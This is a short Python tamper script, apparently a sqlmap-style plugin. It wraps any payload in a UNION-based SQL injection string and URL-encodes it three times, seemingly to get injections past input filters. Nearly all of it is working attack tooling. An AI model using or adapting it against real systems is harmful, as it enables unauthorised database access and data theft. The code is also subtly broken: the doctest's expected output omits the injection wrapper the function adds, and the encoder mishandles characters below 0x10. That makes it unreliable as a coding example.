#!/usr/bin/env python

"""
A tamper script that URL encodes payload three times
"""

def urlencode(string):
    encode_string = ""
    for char in string:
        encode_char = hex(ord(char)).replace("0x","%")
        encode_string += encode_char
    return encode_string

def tamper(payload, **kwargs):
    """
    URL encode payload three times

    >>> tamper("SELECT user FROM users")
    '%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%36%25%32%35%25%33%35%25%33%32%25%32%35%25%33%34%25%36%36%25%32%35%25%33%34%25%36%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%37%25%33%33'
    """

    if payload:
        enpayload = "a' union select 1,''+("+payload+")+'"
        for i in range(3):
            enpayload = urlencode(enpayload)
        return enpayload
    else:
        return payload
